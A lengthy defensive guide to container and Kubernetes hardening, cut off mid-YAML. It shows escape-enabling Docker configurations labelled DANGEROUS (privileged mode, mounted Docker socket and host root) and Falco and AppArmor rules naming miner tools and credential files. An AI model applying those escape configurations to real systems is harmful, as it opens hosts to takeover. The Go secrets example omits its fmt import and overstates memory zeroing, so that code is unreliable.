---
title: Container Security Complete Guide
description: Master container security best practices
track: security
section: infra-security
difficulty: advanced
tags:
  - Container Security
  - Docker Security
  - Kubernetes Security
  - Image Scanning
status: imported
origin: old/src/content/docs/security/container-security.en.md
divergence: 0.217
issues:
  - title-lang-zh
  - title-language
legacy:
  category: Security
  subcategory: Container
  order: 7
  lastUpdated: 2026-01-07
---

Container technology has become the standard for modern application deployment. The widespread adoption of Docker and Kubernetes has made container security an indispensable part of enterprise security architecture. While containers provide isolation and portability, they also introduce new attack surfaces and security challenges. This article covers all aspects of container security, from threat modeling to practical protection measures, to help you build secure containerized applications.

## Container Threat Model

### Security Boundaries in Container Technology

Before diving into container security, we need to understand the security boundaries and potential attack surfaces:

```
+------------------------------------------------------------------+
|                    Container Security Attack Surface              |
+------------------------------------------------------------------+
|                                                                   |
|  +----------------+  +----------------+  +----------------+       |
|  |   Image Layer  |  |  Runtime Layer |  | Orchestration  |       |
|  +----------------+  +----------------+  +----------------+       |
|  | - Malicious    |  | - Container    |  | - API Abuse    |       |
|  |   base images  |  |   escape       |  | - Misconfig    |       |
|  | - Vulnerable   |  | - Privilege    |  | - Network      |       |
|  |   dependencies |  |   escalation   |  |   attacks      |       |
|  | - Secret leaks |  | - Resource     |  | - RBAC bypass  |       |
|  | - Supply chain |  |   exhaustion   |  |                |       |
|  |   attacks      |  | - Process      |  |                |       |
|  |                |  |   injection    |  |                |       |
|  +----------------+  +----------------+  +----------------+       |
|                                                                   |
|  +----------------+  +----------------+  +----------------+       |
|  |   Host Layer   |  |  Network Layer |  |   Data Layer   |       |
|  +----------------+  +----------------+  +----------------+       |
|  | - Kernel       |  | - Container-   |  | - Volume mount |       |
|  |   exploits     |  |   to-container |  |   exposure     |       |
|  | - Docker       |  |   attacks      |  | - Secrets      |       |
|  |   daemon       |  | - MITM attacks |  |   exposure     |       |
|  | - Shared       |  | - Port         |  | - Log leaks    |       |
|  |   resources    |  |   exposure     |  |                |       |
|  +----------------+  +----------------+  +----------------+       |
|                                                                   |
+------------------------------------------------------------------+
```

### Common Threat Types

#### Image-Related Threats

```yaml
# Threat example: Using untrusted base images
# DANGEROUS example
FROM random-user/ubuntu:latest  # Unknown source image

# SECURE example
FROM ubuntu:22.04@sha256:abc123...  # Official image with pinned digest
```

#### Container Escape Threats

Container escape is one of the most severe container security threats. Attackers may exploit the following methods to break container isolation:

```bash
# DANGEROUS configuration - Privileged container
docker run --privileged -it ubuntu bash

# DANGEROUS configuration - Mounting Docker Socket
docker run -v /var/run/docker.sock:/var/run/docker.sock ubuntu

# DANGEROUS configuration - Mounting host root directory
docker run -v /:/host ubuntu
```

#### Supply Chain Attacks

```
Attack Chain Example:
1. Attacker compromises open source dependency repository
2. Injects malicious code into popular base image
3. Developer pulls contaminated image during build
4. Malicious code executes in production environment
5. Data exfiltration or system compromise
```

### Attack Vectors Deep Dive

Understanding the attack vectors helps in building proper defenses:

```
+------------------------------------------------------------------+
|                    Container Attack Vectors                       |
+------------------------------------------------------------------+
|                                                                   |
|  Build Time Attacks:                                              |
|  - Malicious base images                                          |
|  - Compromised build pipelines                                    |
|  - Vulnerable dependencies                                        |
|  - Hardcoded secrets in Dockerfile                                |
|                                                                   |
|  Deploy Time Attacks:                                             |
|  - Insecure registry communication                                |
|  - Image tampering during transfer                                |
|  - Misconfigured orchestration                                    |
|                                                                   |
|  Runtime Attacks:                                                 |
|  - Container escape via kernel exploits                           |
|  - Resource exhaustion (DoS)                                      |
|  - Network-based attacks                                          |
|  - Cryptojacking                                                  |
|                                                                   |
+------------------------------------------------------------------+
```

## Image Security

### Choosing Minimal Base Images

Using minimal base images significantly reduces the attack surface:

```dockerfile
# NOT recommended - Full Ubuntu image (~77MB)
FROM ubuntu:22.04

# RECOMMENDED - Alpine image (~5MB)
FROM alpine:3.18

# BEST - Distroless image (~2MB)
FROM gcr.io/distroless/static-debian12

# Language-specific minimal images
# Go application
FROM golang:1.21-alpine AS builder
WORKDIR /app
COPY . .
RUN CGO_ENABLED=0 go build -o main .

FROM gcr.io/distroless/static-debian12
COPY --from=builder /app/main /
CMD ["/main"]

# Node.js application
FROM node:20-alpine AS builder
WORKDIR /app
COPY package*.json ./
RUN npm ci --only=production

FROM gcr.io/distroless/nodejs20-debian12
COPY --from=builder /app/node_modules /app/node_modules
COPY . /app
CMD ["app/index.js"]

# Python application
FROM python:3.11-slim AS builder
WORKDIR /app
COPY requirements.txt .
RUN pip install --no-cache-dir -r requirements.txt

FROM gcr.io/distroless/python3-debian12
COPY --from=builder /usr/local/lib/python3.11/site-packages /usr/local/lib/python3.11/site-packages
COPY . /app
WORKDIR /app
CMD ["main.py"]
```

### Image Scanning Practices

#### Using Trivy for Vulnerability Scanning

```bash
# Install Trivy
curl -sfL https://raw.githubusercontent.com/aquasecurity/trivy/main/contrib/install.sh | sh -s -- -b /usr/local/bin

# Scan local image
trivy image myapp:latest

# Scan and show only HIGH and CRITICAL vulnerabilities
trivy image --severity HIGH,CRITICAL myapp:latest

# Generate JSON format report
trivy image --format json --output report.json myapp:latest

# Use in CI/CD - fail on vulnerabilities
trivy image --exit-code 1 --severity CRITICAL myapp:latest

# Scan filesystem for IaC misconfigurations
trivy fs --security-checks vuln,config /path/to/project

# Scan Kubernetes cluster
trivy k8s --report summary cluster
```

#### Using Grype for Vulnerability Detection

```bash
# Install Grype
curl -sSfL https://raw.githubusercontent.com/anchore/grype/main/install.sh | sh -s -- -b /usr/local/bin

# Scan an image
grype myapp:latest

# Output in JSON format
grype myapp:latest -o json > vulnerabilities.json

# Fail if vulnerabilities of specified severity found
grype myapp:latest --fail-on high
```

#### Integrating into CI/CD Pipeline

```yaml
# GitHub Actions example
name: Container Security Scan

on:
  push:
    branches: [main]
  pull_request:
    branches: [main]

jobs:
  security-scan:
    runs-on: ubuntu-latest
    steps:
      - name: Checkout code
        uses: actions/checkout@v4

      - name: Build Docker image
        run: docker build -t myapp:${{ github.sha }} .

      - name: Run Trivy vulnerability scanner
        uses: aquasecurity/trivy-action@master
        with:
          image-ref: 'myapp:${{ github.sha }}'
          format: 'sarif'
          output: 'trivy-results.sarif'
          severity: 'CRITICAL,HIGH'

      - name: Upload Trivy scan results
        uses: github/codeql-action/upload-sarif@v2
        with:
          sarif_file: 'trivy-results.sarif'

      - name: Fail on critical vulnerabilities
        uses: aquasecurity/trivy-action@master
        with:
          image-ref: 'myapp:${{ github.sha }}'
          exit-code: '1'
          severity: 'CRITICAL'

      - name: Sign image with Cosign
        if: github.ref == 'refs/heads/main'
        run: |
          cosign sign --key cosign.key myapp:${{ github.sha }}
```

### Secure Dockerfile Practices

```dockerfile
# Secure multi-stage build example
# Stage 1: Build
FROM golang:1.21-alpine AS builder

# Install necessary build tools
RUN apk add --no-cache git ca-certificates tzdata

# Create non-root user
RUN adduser -D -g '' appuser

WORKDIR /build

# Leverage cache layer - copy dependency files first
COPY go.mod go.sum ./
RUN go mod download

# Copy source code
COPY . .

# Compile as static binary
RUN CGO_ENABLED=0 GOOS=linux GOARCH=amd64 go build \
    -ldflags='-w -s -extldflags "-static"' \
    -o /app/main ./cmd/server

# Stage 2: Runtime
FROM scratch

# Copy necessary files from build stage
COPY --from=builder /usr/share/zoneinfo /usr/share/zoneinfo
COPY --from=builder /etc/ssl/certs/ca-certificates.crt /etc/ssl/certs/
COPY --from=builder /etc/passwd /etc/passwd
COPY --from=builder /app/main /main

# Use non-root user
USER appuser

# Expose port
EXPOSE 8080

# Health check
HEALTHCHECK --interval=30s --timeout=3s --start-period=5s --retries=3 \
    CMD ["/main", "health"]

# Run application
ENTRYPOINT ["/main"]
```

### Image Signing and Verification

```bash
# Generate Cosign key pair
cosign generate-key-pair

# Sign an image
cosign sign --key cosign.key myregistry/myapp:v1.0.0

# Verify image signature
cosign verify --key cosign.pub myregistry/myapp:v1.0.0

# Sign with keyless (using OIDC identity)
COSIGN_EXPERIMENTAL=1 cosign sign myregistry/myapp:v1.0.0

# Verify keyless signature
COSIGN_EXPERIMENTAL=1 cosign verify myregistry/myapp:v1.0.0
```

## Runtime Security

### Container Runtime Security Configuration

```bash
# Secure Docker run command
docker run \
    --name secure-app \
    --user 1000:1000 \                    # Non-root user
    --read-only \                          # Read-only filesystem
    --tmpfs /tmp:rw,noexec,nosuid \       # Temp directory non-executable
    --cap-drop ALL \                       # Drop all capabilities
    --cap-add NET_BIND_SERVICE \          # Add only necessary capability
    --security-opt no-new-privileges \    # Disable privilege escalation
    --security-opt seccomp=default.json \ # Seccomp profile
    --pids-limit 100 \                    # Limit process count
    --memory 512m \                        # Memory limit
    --cpus 0.5 \                          # CPU limit
    --network custom-bridge \              # Custom network
    --restart on-failure:3 \              # Restart policy
    myapp:latest
```

### Seccomp Profile Configuration

```json
{
  "defaultAction": "SCMP_ACT_ERRNO",
  "architectures": [
    "SCMP_ARCH_X86_64",
    "SCMP_ARCH_X86",
    "SCMP_ARCH_AARCH64"
  ],
  "syscalls": [
    {
      "names": [
        "accept",
        "accept4",
        "bind",
        "clone",
        "close",
        "connect",
        "epoll_create",
        "epoll_create1",
        "epoll_ctl",
        "epoll_wait",
        "epoll_pwait",
        "execve",
        "exit",
        "exit_group",
        "fcntl",
        "fstat",
        "futex",
        "getpeername",
        "getsockname",
        "getsockopt",
        "listen",
        "lseek",
        "mmap",
        "mprotect",
        "munmap",
        "nanosleep",
        "open",
        "openat",
        "poll",
        "read",
        "recvfrom",
        "recvmsg",
        "rt_sigaction",
        "rt_sigprocmask",
        "rt_sigreturn",
        "sendmsg",
        "sendto",
        "setsockopt",
        "shutdown",
        "socket",
        "stat",
        "write",
        "writev"
      ],
      "action": "SCMP_ACT_ALLOW"
    }
  ]
}
```

### AppArmor Profile Configuration

```
# /etc/apparmor.d/docker-secure-app
#include <tunables/global>

profile docker-secure-app flags=(attach_disconnected,mediate_deleted) {
  #include <abstractions/base>

  # Network access
  network inet tcp,
  network inet udp,
  network inet icmp,

  # Deny raw sockets
  deny network raw,
  deny network packet,

  # Filesystem access
  /app/** r,
  /tmp/** rw,

  # Deny sensitive paths
  deny /etc/shadow r,
  deny /etc/passwd w,
  deny /proc/*/mem rw,
  deny /sys/** w,

  # Deny mount operations
  deny mount,
  deny umount,

  # Deny ptrace
  deny ptrace,

  # Capability restrictions
  capability net_bind_service,
  deny capability sys_admin,
  deny capability sys_ptrace,
}
```

### Runtime Detection with Falco

```yaml
# Falco custom rules for runtime security monitoring
- rule: Container Shell Spawned
  desc: Detect interactive shell spawned in container
  condition: >
    spawned_process
    and container
    and shell_procs
    and proc.tty != 0
  output: >
    Interactive shell detected in container (user=%user.name container=%container.name
    shell=%proc.name parent=%proc.pname cmdline=%proc.cmdline terminal=%proc.tty)
  priority: WARNING
  tags: [container, shell, mitre_execution]

- rule: Sensitive File Access in Container
  desc: Detect container accessing host sensitive files
  condition: >
    open_read
    and container
    and sensitive_files
  output: >
    Container accessing sensitive file (user=%user.name command=%proc.cmdline
    file=%fd.name container=%container.name image=%container.image.repository)
  priority: WARNING
  tags: [container, filesystem, mitre_credential_access]

- rule: Cryptocurrency Mining Detected
  desc: Detect potential cryptocurrency mining activity
  condition: >
    spawned_process
    and container
    and (
      proc.name in (crypto_miner_names)
      or proc.cmdline contains "stratum+tcp"
      or proc.cmdline contains "mining.pool"
    )
  output: >
    Potential cryptocurrency mining detected (user=%user.name command=%proc.cmdline
    container=%container.name image=%container.image.repository)
  priority: CRITICAL
  tags: [container, cryptomining, mitre_execution]

- rule: Container Drift Detected
  desc: Detect new executable in running container
  condition: >
    spawned_process
    and container
    and not proc.exe in (container.image.processes)
  output: >
    New executable detected in container (proc=%proc.name exe=%proc.exe
    container=%container.name image=%container.image.repository)
  priority: WARNING
  tags: [container, drift]

- list: crypto_miner_names
  items: [xmrig, minerd, cpuminer, stratum, cgminer, bfgminer]

- list: sensitive_files
  items: [/etc/shadow, /etc/sudoers, /etc/kubernetes, /var/run/secrets]
```

## Privilege Control

### Running as Non-Root User

```dockerfile
# Method 1: Create user in Dockerfile
FROM alpine:3.18

# Create application directory
RUN mkdir -p /app && chown -R nobody:nobody /app

# Install application
COPY --chown=nobody:nobody app /app/

# Switch to non-root user
USER nobody

WORKDIR /app
CMD ["./app"]

# Method 2: Use specific UID/GID
FROM ubuntu:22.04

# Create user with specific UID/GID
RUN groupadd -g 10001 appgroup && \
    useradd -u 10001 -g appgroup -s /sbin/nologin -M appuser

# Set file permissions
COPY --chown=appuser:appgroup . /app

USER 10001:10001

CMD ["/app/main"]
```

### Linux Capabilities Management

```bash
# View container capabilities
docker run --rm alpine capsh --print

# Drop all capabilities and add only necessary ones
docker run --cap-drop ALL --cap-add NET_BIND_SERVICE nginx

# Common capabilities explained:
# NET_BIND_SERVICE - Bind ports below 1024
# CHOWN - Change file ownership
# DAC_OVERRIDE - Bypass file permission checks
# SETUID/SETGID - Change process UID/GID
# SYS_ADMIN - System administration (DANGEROUS!)
# NET_RAW - Use raw sockets
# SYS_PTRACE - Trace processes
```

```yaml
# Kubernetes Pod configuration with security context
apiVersion: v1
kind: Pod
metadata:
  name: secure-pod
spec:
  securityContext:
    runAsNonRoot: true
    runAsUser: 10001
    runAsGroup: 10001
    fsGroup: 10001
    seccompProfile:
      type: RuntimeDefault
  containers:
    - name: app
      image: myapp:latest
      securityContext:
        allowPrivilegeEscalation: false
        readOnlyRootFilesystem: true
        capabilities:
          drop:
            - ALL
          add:
            - NET_BIND_SERVICE
      volumeMounts:
        - name: tmp
          mountPath: /tmp
        - name: cache
          mountPath: /app/cache
      resources:
        limits:
          memory: "256Mi"
          cpu: "500m"
        requests:
          memory: "128Mi"
          cpu: "250m"
  volumes:
    - name: tmp
      emptyDir: {}
    - name: cache
      emptyDir: {}
```

### User Namespace Mapping

```bash
# Enable user namespace remapping in Docker daemon
# /etc/docker/daemon.json
{
  "userns-remap": "default"
}

# Or specify a custom user
{
  "userns-remap": "dockremap:dockremap"
}

# Create subordinate UID/GID mappings
echo "dockremap:100000:65536" >> /etc/subuid
echo "dockremap:100000:65536" >> /etc/subgid

# Restart Docker daemon
systemctl restart docker
```

## Network Isolation

### Docker Network Security

```bash
# Create isolated user-defined network
docker network create --driver bridge \
    --subnet 172.20.0.0/16 \
    --ip-range 172.20.240.0/20 \
    secure-network

# Create internal network (no external access)
docker network create --driver bridge \
    --internal \
    internal-network

# Run containers in isolated network
docker run -d --name db --network internal-network postgres
docker run -d --name app --network secure-network myapp
docker network connect internal-network app  # app can access db

# Disable inter-container communication
docker network create --driver bridge \
    --opt com.docker.network.bridge.enable_icc=false \
    isolated-network
```

### Kubernetes Network Policies

```yaml
# Default deny all ingress traffic
apiVersion: networking.k8s.io/v1
kind: NetworkPolicy
metadata:
  name: default-deny-ingress
  namespace: production
spec:
  podSelector: {}
  policyTypes:
    - Ingress

---
# Default deny all egress traffic
apiVersion: networking.k8s.io/v1
kind: NetworkPolicy
metadata:
  name: default-deny-egress
  namespace: production
spec:
  podSelector: {}
  policyTypes:
    - Egress

---
# Allow specific service-to-service communication
apiVersion: networking.k8s.io/v1
kind: NetworkPolicy
metadata:
  name: allow-api-to-db
  namespace: production
spec:
  podSelector:
    matchLabels:
      app: database
  policyTypes:
    - Ingress
  ingress:
    - from:
        - podSelector:
            matchLabels:
              app: api-server
        - namespaceSelector:
            matchLabels:
              name: production
      ports:
        - protocol: TCP
          port: 5432

---
# Allow egress to specific services and DNS
apiVersion: networking.k8s.io/v1
kind: NetworkPolicy
metadata:
  name: allow-api-egress
  namespace: production
spec:
  podSelector:
    matchLabels:
      app: api-server
  policyTypes:
    - Egress
  egress:
    # Allow access to database
    - to:
        - podSelector:
            matchLabels:
              app: database
      ports:
        - protocol: TCP
          port: 5432
    # Allow DNS queries
    - to:
        - namespaceSelector: {}
          podSelector:
            matchLabels:
              k8s-app: kube-dns
      ports:
        - protocol: UDP
          port: 53
    # Allow external HTTPS
    - to:
        - ipBlock:
            cidr: 0.0.0.0/0
            except:
              - 10.0.0.0/8
              - 172.16.0.0/12
              - 192.168.0.0/16
      ports:
        - protocol: TCP
          port: 443
```

### Service Mesh Security with Istio

```yaml
# Istio PeerAuthentication - Enforce mTLS
apiVersion: security.istio.io/v1beta1
kind: PeerAuthentication
metadata:
  name: default
  namespace: production
spec:
  mtls:
    mode: STRICT

---
# Istio AuthorizationPolicy - Fine-grained access control
apiVersion: security.istio.io/v1beta1
kind: AuthorizationPolicy
metadata:
  name: api-server-policy
  namespace: production
spec:
  selector:
    matchLabels:
      app: api-server
  action: ALLOW
  rules:
    - from:
        - source:
            principals: ["cluster.local/ns/production/sa/frontend"]
      to:
        - operation:
            methods: ["GET", "POST"]
            paths: ["/api/*"]
    - from:
        - source:
            principals: ["cluster.local/ns/production/sa/admin"]
      to:
        - operation:
            methods: ["*"]
```

## Secrets Management

### Kubernetes Secrets Security Practices

```yaml
# NOT recommended: Plain text Secret
apiVersion: v1
kind: Secret
metadata:
  name: db-credentials
type: Opaque
data:
  username: YWRtaW4=  # base64 encoded, NOT encrypted
  password: cGFzc3dvcmQ=

---
# RECOMMENDED: Use External Secrets management
# Using External Secrets Operator
apiVersion: external-secrets.io/v1beta1
kind: ExternalSecret
metadata:
  name: db-credentials
  namespace: production
spec:
  refreshInterval: 1h
  secretStoreRef:
    name: aws-secrets-manager
    kind: ClusterSecretStore
  target:
    name: db-credentials
    creationPolicy: Owner
  data:
    - secretKey: username
      remoteRef:
        key: production/database
        property: username
    - secretKey: password
      remoteRef:
        key: production/database
        property: password
```

### Using HashiCorp Vault

```yaml
# Vault Agent Injector configuration
apiVersion: v1
kind: Pod
metadata:
  name: app-with-vault
  annotations:
    vault.hashicorp.com/agent-inject: 'true'
    vault.hashicorp.com/role: 'app-role'
    vault.hashicorp.com/agent-inject-secret-db-creds: 'secret/data/db/credentials'
    vault.hashicorp.com/agent-inject-template-db-creds: |
      {{- with secret "secret/data/db/credentials" -}}
      export DB_USER="{{ .Data.data.username }}"
      export DB_PASS="{{ .Data.data.password }}"
      {{- end -}}
spec:
  serviceAccountName: app-service-account
  containers:
    - name: app
      image: myapp:latest
      command: ['/bin/sh', '-c']
      args:
        - source /vault/secrets/db-creds && ./start.sh
```

### Application-Level Secrets Handling

```go
// Go application secure secrets handling
package main

import (
    "context"
    "log"
    "os"
    "sync"
    "time"

    vault "github.com/hashicorp/vault/api"
    auth "github.com/hashicorp/vault/api/auth/kubernetes"
)

type SecretManager struct {
    client *vault.Client
    cache  map[string]*CachedSecret
    mutex  sync.RWMutex
}

type CachedSecret struct {
    Value     string
    ExpiresAt time.Time
}

func NewSecretManager() (*SecretManager, error) {
    config := vault.DefaultConfig()
    client, err := vault.NewClient(config)
    if err != nil {
        return nil, err
    }

    // Use Kubernetes authentication
    k8sAuth, err := auth.NewKubernetesAuth(
        "app-role",
        auth.WithServiceAccountTokenPath("/var/run/secrets/kubernetes.io/serviceaccount/token"),
    )
    if err != nil {
        return nil, err
    }

    authInfo, err := client.Auth().Login(context.Background(), k8sAuth)
    if err != nil {
        return nil, err
    }

    if authInfo == nil {
        return nil, fmt.Errorf("no auth info was returned")
    }

    return &SecretManager{
        client: client,
        cache:  make(map[string]*CachedSecret),
    }, nil
}

func (sm *SecretManager) GetSecret(path, key string) (string, error) {
    cacheKey := path + "/" + key

    // Check cache with read lock
    sm.mutex.RLock()
    if cached, ok := sm.cache[cacheKey]; ok {
        if time.Now().Before(cached.ExpiresAt) {
            sm.mutex.RUnlock()
            return cached.Value, nil
        }
    }
    sm.mutex.RUnlock()

    // Fetch from Vault
    secret, err := sm.client.Logical().Read(path)
    if err != nil {
        return "", err
    }

    if secret == nil || secret.Data == nil {
        return "", fmt.Errorf("secret not found: %s", path)
    }

    data, ok := secret.Data["data"].(map[string]interface{})
    if !ok {
        return "", fmt.Errorf("invalid secret format")
    }

    value, ok := data[key].(string)
    if !ok {
        return "", fmt.Errorf("key not found: %s", key)
    }

    // Update cache with write lock
    sm.mutex.Lock()
    sm.cache[cacheKey] = &CachedSecret{
        Value:     value,
        ExpiresAt: time.Now().Add(5 * time.Minute),
    }
    sm.mutex.Unlock()

    return value, nil
}

// Cleanup - Clear secrets from memory on exit
func (sm *SecretManager) Cleanup() {
    sm.mutex.Lock()
    defer sm.mutex.Unlock()

    for key := range sm.cache {
        // Overwrite with zeros before deletion
        sm.cache[key].Value = ""
        delete(sm.cache, key)
    }
}
```

### Secrets Encryption at Rest

```yaml
# Kubernetes EncryptionConfiguration
apiVersion: apiserver.config.k8s.io/v1
kind: EncryptionConfiguration
resources:
  - resources:
      - secrets
    providers:
      - aescbc:
          keys:
            - name: key1
              secret: <base64-encoded-32-byte-key>
      - identity: {}

---
# Or use KMS provider for cloud-managed keys
apiVersion: apiserver.config.k8s.io/v1
kind: EncryptionConfiguration
resources:
  - resources:
      - secrets
    providers:
      - kms:
          name: aws-encryption-provider
          endpoint: unix:///var/run/kmsplugin/socket.sock
          cachesize: 1000
          timeout: 3s
      - identity: {}
```

## Kubernetes Security

### RBAC Configuration

```yaml
# Minimal privilege ServiceAccount configuration
apiVersion: v1
kind: ServiceAccount
metadata:
  name: app-service-account
  namespace: production
automountServiceAccountToken: false  # Don't mount token by default

---
# Read-only ConfigMap permissions
apiVersion: rbac.authorization.k8s.io/v1
kind: Role
metadata:
  name: app-role
  namespace: production
rules:
  - apiGroups: [""]
    resources: ["configmaps"]
    resourceNames: ["app-config"]  # Restrict to specific resource
    verbs: ["get", "watch"]
  - apiGroups: [""]
    resources: ["secrets"]
    resourceNames: ["app-secrets"]
    verbs: ["get"]

---
apiVersion: rbac.authorization.k8s.io/v1
kind: RoleBinding
metadata:
  name: app-role-binding
  namespace: production
subjects:
  - kind: ServiceAccount
    name: app-service-account
    namespace: production
roleRef:
  kind: Role
  name: app-role
  apiGroup: rbac.authorization.k8s.io

---
# Application Pod configuration
apiVersion: v1
kind: Pod
metadata:
  name: secure-app
  namespace: production
spec:
  serviceAccountName: app-service-account
  automountServiceAccountToken: true  # Only mount when needed
  containers:
    - name: app
      image: myapp:latest
```

### API Server Security Hardening

```yaml
# /etc/kubernetes/manifests/kube-apiserver.yaml
apiVersion: v1
kind: Pod
metadata:
  name: kube-apiserver
  namespace: kube-system
spec:
  containers:
    - name: kube-apiserver
      command:
        - kube-apiserver
        # Authentication configuration
        - --anonymous-auth=false
        - --authentication-token-webhook-config-file=/etc/kubernetes/webhook-config.yaml

        # Authorization configuration
        - --authorization-mode=RBAC,Node

        # Audit logging
        - --audit-log-path=/var/log/kubernetes/audit.log
        - --audit-log-maxage=30
        - --audit-log-maxbackup=10
        - --audit-log-maxsize=100
        - --audit-policy-file=/etc/kubernetes/audit-policy.yaml

        # TLS configuration
        - --tls-min-version=VersionTLS12
        - --tls-cipher-suites=TLS_ECDHE_RSA_WITH_AES_128_GCM_SHA256,TLS_ECDHE_RSA_WITH_AES_256_GCM_SHA384

        # Other security configurations
        - --enable-admission-plugins=NodeRestriction,PodSecurity
        - --profiling=false
        - --enable-bootstrap-token-auth=true
```

### Audit Policy Configuration

```yaml
# /etc/kubernetes/audit-policy.yaml
apiVersion: audit.k8s.io/v1
kind: Policy
rules:
  # Don't log these requests
  - level: None
    users: ["system:kube-proxy"]
    verbs: ["watch"]
    resources:
      - group: ""
        resources: ["endpoints", "services", "services/status"]

  # Log authentication failures
  - level: Metadata
    omitStages:
      - RequestReceived
    resources:
      - group: "authentication.k8s.io"
        resources: ["tokenreviews"]

  # Detailed logging for secrets operations
  - level: RequestResponse
    resources:
      - group: ""
        resources: ["secrets"]

  # Log metadata for all other requests
  - level: Metadata
    omitStages:
      - RequestReceived
```

### Admission Controllers

```yaml
# ValidatingWebhookConfiguration for custom validation
apiVersion: admissionregistration.k8s.io/v1
kind: ValidatingWebhookConfiguration
metadata:
  name: security-policy-webhook
webhooks:
  - name: security.webhook.example.com
    clientConfig:
      service:
        name: security-webhook
        namespace: security-system
        path: "/validate"
      caBundle: <base64-encoded-ca-cert>
    rules:
      - operations: ["CREATE", "UPDATE"]
        apiGroups: [""]
        apiVersions: ["v1"]
        resources: ["pods"]
    admissionReviewVersions: ["v1"]
    sideEffects: None
    failurePolicy: Fail
    namespaceSelector:
      matchLabels:
        security-policy: enabled
```

## Pod Security Policies

### Pod Security Standards (PSS)

Starting from Kubernetes 1.25, PodSecurityPolicy is deprecated and replaced by Pod Security Standards:

```yaml
# Enforce security policy at namespace level
apiVersion: v1
kind: Namespace
metadata:
  name: production
  labels:
    # Enforce restricted policy
    pod-security.kubernetes.io/enforce: restricted
    pod-security.kubernetes.io/enforce-version: latest
    # Audit baseline violations
    pod-security.kubernetes.io/audit: baseline
    pod-security.kubernetes.io/audit-version: latest
    # Warn on baseline violations
    pod-security.kubernetes.io/warn: baseline
    pod-security.kubernetes.io/warn-version: latest
```

### Pod Configuration Compliant with Restricted Policy

```yaml
apiVersion: v1
kind: Pod
metadata:
  name: restricted-pod
  namespace: production
spec:
  # Pod-level security context
  securityContext:
    runAsNonRoot: true
    runAsUser: 10001
    runAsGroup: 10001
    fsGroup: 10001
    seccompProfile:
      type: RuntimeDefault

  containers:
    - name: app
      image: myapp:latest

      # Container-level security context
      securityContext:
        allowPrivilegeEscalation: false
        readOnlyRootFilesystem: true
        capabilities:
          drop:
            - ALL
        # If binding to low ports is needed
        # capabilities:
        #   add:
        #     - NET_BIND_SERVICE

      # Resource limits
      resources:
        limits:
          memory: "256Mi"
          cpu: "500m"
        requests:
          memory: "128Mi"
          cpu: "250m"

      # Mount points
      volumeMounts:
        - name: tmp
          mountPath: /tmp
        - name: config
          mountPath: /app/config
          readOnly: true

  volumes:
    - name: tmp
      emptyDir: {}
    - name: config
      configMap:
        name: app-config
```

### OPA Gatekeeper Policy Examples

```yaml
# After installing Gatekeeper, define constraint templates
apiVersion: templates.gatekeeper.sh/v1
kind: ConstraintTemplate
metadata:
  name: k8srequiredlabels
spec:
  crd:
    spec:
      names:
        kind: K8sRequiredLabels
      validation:
        openAPIV3Schema:
          type: object
          properties:
            labels:
              type: array
              items:
                type: string
  targets:
    - target: admission.k8s.gatekeeper.sh
      rego: |
        package k8srequiredlabels

        violation[{"msg": msg, "details": {"missing_labels": missing}}] {
          provided := {label | input.review.object.metadata.labels[label]}
          required := {label | label := input.parameters.labels[_]}
          missing := required - provided
          count(missing) > 0
          msg := sprintf("Resource is missing required labels: %v", [missing])
        }

---
# Apply constraint
apiVersion: constraints.gatekeeper.sh/v1beta1
kind: K8sRequiredLabels
metadata:
  name: require-team-label
spec:
  match:
    kinds:
      - apiGroups: [""]
        kinds: ["Pod"]
    namespaces:
      - production
  parameters:
    labels:
      - "team"
      - "app"
      - "environment"

---
# Constraint template to deny privileged containers
apiVersion: templates.gatekeeper.sh/v1
kind: ConstraintTemplate
metadata:
  name: k8sdenypriv
spec:
  crd:
    spec:
      names:
        kind: K8sDenyPrivileged
  targets:
    - target: admission.k8s.gatekeeper.sh
      rego: |
        package k8sdenypriv

        violation[{"msg": msg}] {
          container := input.review.object.spec.containers[_]
          container.securityContext.privileged == true
          msg := sprintf("Container %v is not allowed to run in privileged mode", [container.name])
        }

        violation[{"msg": msg}] {
          container := input.review.object.spec.initContainers[_]
          container.securityContext.privileged == true
          msg := sprintf("Init container %v is not allowed to run in privileged mode", [container.name])
        }

---
# Constraint to block host namespaces
apiVersion: templates.gatekeeper.sh/v1
kind: ConstraintTemplate
metadata:
  name: k8sdenyhostnamespaces
spec:
  crd:
    spec:
      names:
        kind: K8sDenyHostNamespaces
  targets:
    - target: admission.k8s.gatekeeper.sh
      rego: |
        package k8sdenyhostnamespaces

        violation[{"msg": msg}] {
          input.review.object.spec.hostNetwork == true
          msg := "hostNetwork is not allowed"
        }

        violation[{"msg": msg}] {
          input.review.object.spec.hostPID == true
          msg := "hostPID is not allowed"
        }

        violation[{"msg": msg}] {
          input.review.object.spec.hostIPC == true
          msg := "hostIPC is not allowed"
        }
```

### Kyverno Policy Examples

```yaml
# Kyverno policy to require non-root containers
apiVersion: kyverno.io/v1
kind: ClusterPolicy
metadata:
  name: require-run-as-nonroot
spec:
  validationFailureAction: enforce
  background: true
  rules:
    - name: check-runasnonroot
      match:
        any:
          - resources:
              kinds:
                - Pod
      validate:
        message: "Running as root is not allowed. Set runAsNonRoot to true."
        pattern:
          spec:
            securityContext:
              runAsNonRoot: true
            containers:
              - securityContext:
                  runAsNonRoot: true

---
# Kyverno policy to add default security context
apiVersion: kyverno.io/v1
kind: ClusterPolicy
metadata:
  name: add-default-securitycontext
spec:
  rules:
    - name: add-securitycontext
      match:
        any:
          - resources:
              kinds:
                - Pod
      mutate:
        patchStrategicMerge:
          spec:
            securityContext:
              runAsNonRoot: true
              seccompProfile:
                type: RuntimeDefault
            containers:
              - (name): "*"
                securityContext:
                  allowPrivilegeEscalation: false
                  capabilities:
                    drop:
                      - ALL
```

## Security Monitoring

### Prometheus Monitoring Configuration

```yaml
# Prometheus container security monitoring metrics
apiVersion: monitoring.coreos.com/v1
kind: PrometheusRule
metadata:
  name: container-security-rules
  namespace: monitoring
spec:
  groups:
    - name: container-security
      rules:
        # Privileged container alert
        - alert: PrivilegedContainerRunning
          expr: |
            kube_pod_container_info{container!=""}
            * on (pod, namespace)
            group_left()
            (kube_pod_spec_containers_privileged == 1)
          for: 1m
          labels:
            severity: critical
          annotations:
            summary: "Privileged container detected"
            description: "Pod {{ $labels.pod }} in namespace {{ $labels.namespace }} is running in privileged mode"

        # Container running as root alert
        - alert: ContainerRunningAsRoot
          expr: |
            kube_pod_container_info{container!=""}
            * on (pod, namespace)
            group_left()
            (kube_pod_container_status_running{container!=""} == 1)
            * on (pod, namespace)
            group_left()
            (kube_pod_spec_containers_runasnonroot == 0 or absent(kube_pod_spec_containers_runasnonroot))
          for: 5m
          labels:
